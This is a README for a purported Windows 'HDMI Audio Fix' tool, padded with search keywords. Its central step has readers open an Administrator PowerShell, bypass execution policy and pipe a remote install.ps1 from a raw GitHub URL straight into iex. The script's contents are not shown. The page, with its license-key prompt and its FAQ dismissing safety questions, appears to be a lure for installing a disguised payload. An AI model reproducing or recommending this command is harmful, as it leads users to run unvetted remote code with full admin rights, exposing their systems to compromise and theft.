# HDMI Audio Fix — PowerShell

**HDMI-Audio-Fix-PowerShell**

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/v1.2.0-stable-brightgreen?style=flat-square)]()
[![Install](https://img.shields.io/badge/Install-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white)]()

Fix HDMI no sound, DisplayPort audio missing and NVIDIA HD Audio not detected.

---

## Quick Install

Open **PowerShell as Administrator** (Win + X → Terminal Admin) and run:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

The installer downloads the latest build, prompts for your license key and completes setup automatically.

## Step-by-Step

| Step | Action |
|------|--------|
| 1 | Press **Win + X**, choose **Terminal (Admin)** or **PowerShell (Admin)** |
| 2 | Paste the command block above and press **Enter** |
| 3 | Wait for download — progress shown in the console |
| 4 | Enter license key when prompted (also in `license.txt` after install) |
| 5 | Restart if the installer asks — then launch from Start menu |

If execution is blocked, run `Set-ExecutionPolicy Bypass -Scope Process -Force`, then paste the **Quick Install** command again.

---

## Overview

Install HDMI Audio Fix via PowerShell — restore HDMI and DisplayPort audio on Windows 10/11 when TV or monitor has no sound, NVIDIA/AMD HD Audio missing.

## Common Searches

- hdmi no sound to tv windows 11
- nvidia hd audio not showing
- displayport no audio monitor
- no audio output device hdmi
- hdmi sound not working after update

## Features

* **HDMI audio device** — Enables NVIDIA/AMD HD Audio output on GPU port.
* **Default device** — Sets correct playback device for TV and monitor.
* **Driver repair** — Reinstalls audio endpoint driver for HDMI/DP.
* **DisplayPort audio** — Fixes DP monitors with no sound output.
* **TV no sound** — Repairs audio handshake between PC and HDMI TV.

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum |
| PowerShell | 5.1 or PowerShell 7+ |
| Admin | Required |
| Network | Required for download |

## FAQ

**How do I install without a browser?**
Use the PowerShell command above — no browser needed after Admin shell is open.

**Where is the license key?**
Shown during install and saved to `license.txt` in the install folder.

**Is the script safe to run?**
Hosted on GitHub raw; review `install.ps1` before running if you prefer.

**No sound through HDMI to TV?**
Enables GPU HD Audio and sets it as default device.

**NVIDIA HD Audio not showing?**
Reinstalls NVIDIA audio driver component.

**DisplayPort monitor no audio?**
Same fix — GPU audio endpoint on DP output.

**Worked before Windows Update?**
Repairs audio stack after update broke HDMI device.

---

TAGS hdmi audio not working, hdmi no sound windows 11, nvidia hd audio missing, displayport no audio, powershell install, windows setup script

## License

[MIT](LICENSE)
